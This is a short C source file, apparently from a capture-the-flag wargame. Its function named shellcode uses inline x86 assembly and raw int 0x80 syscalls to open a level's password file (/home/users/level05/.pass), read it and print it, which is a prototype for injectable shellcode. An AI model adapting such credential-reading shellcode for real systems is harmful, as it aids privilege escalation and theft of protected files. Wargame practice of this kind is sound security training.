#include <unistd.h>
#include <fcntl.h>

void shellcode(void)
{
    char pass[50];
    char path[] = { '/', 'h', 'o', 'm', 'e', '/', 'u', 's', 'e', 'r', 's', '/', 'l', 'e', 'v', 'e', 'l', '0', '5', '/', '.', 'p', 'a', 's', 's', '\0' };

    // int fd = open(path, O_RDONLY);
    register int eax asm("eax") = 5;            // syscall number for open()
    register const char *arg1 asm("ebx") = path;
    register int arg2 asm("ecx") = O_RDONLY;
    asm volatile("int $0x80");

    // int len = read(fd, pass, 50);
    register int fd asm("ebx") = eax;
    eax = 3;
    register char *buf asm("ecx") = pass;
    register size_t len asm("edx") = 50;
    asm volatile("int $0x80");

    // write(1, pass, len);
    fd = 1;
    len = eax;
    eax = 4;
    asm volatile("int $0x80");
}

int main(void)
{
    shellcode();
}
